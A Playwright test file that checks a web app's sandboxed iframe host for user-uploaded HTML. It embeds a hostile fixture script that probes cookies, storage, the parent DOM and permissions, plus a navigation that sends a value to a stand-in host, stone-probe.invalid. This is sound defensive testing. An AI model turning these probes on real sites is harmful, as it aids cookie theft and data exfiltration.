import { expect, test } from '@playwright/test';
import { readFileSync } from 'node:fs';

// Run the owned backend with SOULSHOUSE_STONES_DOMAIN=soulstones.test.
// Hostnames remain distinct browser origins; only DNS resolution is synthetic.
test.use({
  launchOptions: { args: ['--host-resolver-rules=MAP *.soulstones.test 127.0.0.1', '--no-proxy-server'] },
});
test.skip(
  process.env.SOULSHOUSE_STONES_DOMAIN !== 'soulstones.test',
  'Requires isolated content-host test configuration'
);

function localUrl(url, baseURL) {
  const result = new URL(url);
  result.protocol = 'http:';
  result.port = new URL(baseURL).port;
  return result.href;
}

async function setupStone(request, extra = {}) {
  const response = await request.post('/test/e2e/setup', { data: { run_id: `interactive-${Date.now()}` } });
  const setup = await response.json();
  const fixture = await request.post('/test/e2e/interactive_stone_fixture', {
    data: { account_id: setup.account_id, ...extra },
  });
  expect(fixture.ok(), await fixture.text()).toBe(true);
  return { setup, fixture: await fixture.json() };
}

test('site admin can see the created-stone chart and namespace capacity', async ({ page, request }, testInfo) => {
  const { setup } = await setupStone(request);
  try {
    await page.goto('/login');
    await page.getByLabel(/email/i).fill(setup.admin_user.email);
    await page.getByLabel(/password/i).fill(setup.password);
    await page.getByRole('button', { name: /log in/i }).click();
    await page.waitForURL((url) => !url.pathname.includes('/login'));
    await page.goto('/admin/dashboard');
    const panel = page.getByTestId('stones-dashboard');
    await expect(panel).toBeVisible();
    await expect(panel.getByText('16,777,216', { exact: true })).toBeVisible();
    await expect(panel.getByRole('progressbar')).toHaveAttribute('aria-valuemax', '100');
    await panel.screenshot({ path: testInfo.outputPath('stones-dashboard.png') });
  } finally {
    await request.post('/test/e2e/cleanup', { data: { run_id: setup.run_id } });
  }
});

test('local sound, manual score exchange and trusted unload', async ({ page, request, baseURL }) => {
  const { setup, fixture } = await setupStone(request);
  try {
    await page.goto(localUrl(fixture.url, baseURL));
    await expect(page.locator('iframe')).toHaveCount(1);
    const frame = page.frameLocator('iframe');
    await frame.getByRole('button', { name: 'Play tone' }).click();
    await expect(frame.locator('#status')).toHaveText('running');
    await frame.getByRole('button', { name: 'Write score' }).click();
    await expect(frame.getByRole('textbox', { name: 'Score' })).toHaveValue('[1,0,3]');
    await frame.getByRole('textbox', { name: 'Score' }).fill('[5,2,0]');
    await frame.getByRole('button', { name: 'Load score' }).click();
    await expect(frame.locator('#status')).toHaveText('Loaded 5,2,0');
    expect(await page.locator('iframe').evaluate((el) => el.contentDocument)).toBeNull();
    await page.getByRole('button', { name: 'Stop and unload' }).click();
    await expect(page.locator('iframe')).toHaveCount(0);
    await expect(page.getByRole('status')).toHaveText('Stopped and unloaded');
    await page.getByRole('button', { name: 'Run again' }).click();
    await expect(page.locator('iframe')).toHaveCount(1);
    await expect(page.frameLocator('iframe').getByRole('button', { name: 'Play tone' })).toBeVisible();
    await expect(page.getByRole('status')).toHaveText('Running');
  } finally {
    await request.post('/test/e2e/cleanup', { data: { run_id: setup.run_id } });
  }
});

test('hostile executable storage remains opaque and cannot escape or acquire permissions', async ({
  page,
  request,
  baseURL,
  context,
}) => {
  const hostile = `<!doctype html><h1>Hostile executable</h1>
    <button id="escape">Escape</button><button id="popup">Popup</button>
    <script>
    document.body.dataset.ran = "yes";
    for (const [key, read] of Object.entries({
      cookie: () => document.cookie, storage: () => localStorage.length,
      parent: () => parent.document.body.innerHTML, domain: () => {document.domain="soulstones.test";return document.cookie;}
    })) { try { read(); document.body.dataset[key]="leaked"; } catch(e) { document.body.dataset[key]=e.name; } }
    fetch("http://127.0.0.1:${new URL(baseURL).port}/login?stone_probe=fetch").then(() => document.body.dataset.network="leaked").catch(() => document.body.dataset.network="blocked");
    document.getElementById("escape").onclick=()=>{try{top.location="/login?stone_probe=top";}catch(e){document.body.dataset.escape=e.name;}};
    document.getElementById("popup").onclick=()=>{document.body.dataset.popup=window.open("/login")?"leaked":"blocked";};
    const policy = document.permissionsPolicy || document.featurePolicy;
    document.body.dataset.mic = policy.allowsFeature("microphone") ? "allowed" : "denied";
    document.body.dataset.camera = policy.allowsFeature("camera") ? "allowed" : "denied";
    </script><img src="http://127.0.0.1:${new URL(baseURL).port}/login?stone_probe=img">
    <iframe src="/login?stone_probe=frame"></iframe>
    <form action="/login?stone_probe=form"><button>Submit</button></form>`;
  const { setup, fixture } = await setupStone(request, { hostile_html: hostile });
  try {
    await context.addCookies([{ name: 'house_secret', value: 'synthetic-private', url: baseURL }]);
    const url = localUrl(fixture.url, baseURL);
    await page.goto(url);
    const frame = page.frameLocator('#stone-container > iframe');
    await expect(frame.locator('body')).toHaveAttribute('data-ran', 'yes');
    for (const key of ['cookie', 'storage', 'parent', 'domain']) {
      await expect(frame.locator('body')).toHaveAttribute(`data-${key}`, 'SecurityError');
    }
    await expect(frame.locator('body')).toHaveAttribute('data-network', 'blocked');
    await expect(frame.locator('body')).toHaveAttribute('data-mic', 'denied');
    await expect(frame.locator('body')).toHaveAttribute('data-camera', 'denied');
    await frame.locator('#escape').click();
    expect(page.url()).toBe(url);
    await frame.locator('#popup').click();
    await expect(frame.locator('body')).toHaveAttribute('data-popup', 'blocked');
    const content = new URL('/revisions/1/content', url).href;
    const response = await page.goto(content);
    expect(response.headers()['content-security-policy']).toContain('sandbox allow-scripts;');
    await expect(page.locator('body')).toHaveAttribute('data-cookie', 'SecurityError');
    await expect(page.locator('body')).toHaveAttribute('data-storage', 'SecurityError');
    await expect(page.locator('body')).toHaveAttribute('data-mic', 'denied');
    await expect(page.locator('body')).toHaveAttribute('data-camera', 'denied');
    await expect(page.locator('body')).toHaveAttribute('data-network', 'blocked');
    const blocked = await page.goto(new URL('/login', url).href);
    expect(blocked.status()).toBe(404);
  } finally {
    await request.post('/test/e2e/cleanup', { data: { run_id: setup.run_id } });
  }
});

test('direct content self-navigation remains an explicit network limitation', async ({ page, request, baseURL }) => {
  const { setup, fixture } = await setupStone(request, {
    hostile_html:
      '<!doctype html><button id="send">Send synthetic value</button><script>document.querySelector("button").onclick=()=>{location.href="https://stone-probe.invalid/?value=synthetic";}</script>',
  });
  try {
    // Intercept locally: demonstrate the channel without contacting another service.
    await page.route('https://stone-probe.invalid/**', (route) => route.fulfill({ body: 'Synthetic destination' }));
    const url = localUrl(fixture.url, baseURL);
    await page.goto(new URL('/revisions/1/content', url).href);
    const navigation = page.waitForRequest('https://stone-probe.invalid/?value=synthetic');
    await page.locator('#send').click();
    expect((await navigation).isNavigationRequest()).toBe(true);
    await expect(page).toHaveURL('https://stone-probe.invalid/?value=synthetic');
  } finally {
    await request.post('/test/e2e/cleanup', { data: { run_id: setup.run_id } });
  }
});

test('Wing Counterpoint original plays and exchanges scores', async ({ page, request, baseURL }, testInfo) => {
  test.skip(!process.env.COUNTERPOINT_HTML_PATH, 'Optional original artifact acceptance test');
  const html = readFileSync(process.env.COUNTERPOINT_HTML_PATH, 'utf8');
  const { setup, fixture } = await setupStone(request, { html });
  try {
    await page.goto(localUrl(fixture.url, baseURL));
    const frame = page.frameLocator('iframe');
    await expect(frame.getByRole('heading', { name: 'Counterpoint', exact: true })).toBeVisible();
    await frame.getByRole('button', { name: 'Listen', exact: true }).click();
    await expect(frame.locator('#status')).toContainText('Playing.');
    await frame.getByRole('button', { name: /Answer, step 1:/ }).click();
    await frame.getByText('Carry a score to someone else', { exact: true }).click();
    await frame.getByRole('button', { name: 'Write score' }).click();
    const score = JSON.parse(await frame.getByRole('textbox', { name: 'Portable score' }).inputValue());
    expect(score.b[0]).toBe(1);
    score.tempo = 108;
    await frame.getByRole('textbox', { name: 'Portable score' }).fill(JSON.stringify(score));
    await frame.getByRole('button', { name: 'Load score' }).click();
    await expect(frame.locator('#status')).toContainText('Score loaded.');
    await expect(frame.locator('#tempo')).toHaveValue('108');
    await page.screenshot({ path: testInfo.outputPath('counterpoint-hosted.png'), fullPage: true });
    await page.getByRole('button', { name: 'Stop and unload' }).click();
    await expect(page.locator('iframe')).toHaveCount(0);
  } finally {
    await request.post('/test/e2e/cleanup', { data: { run_id: setup.run_id } });
  }
});
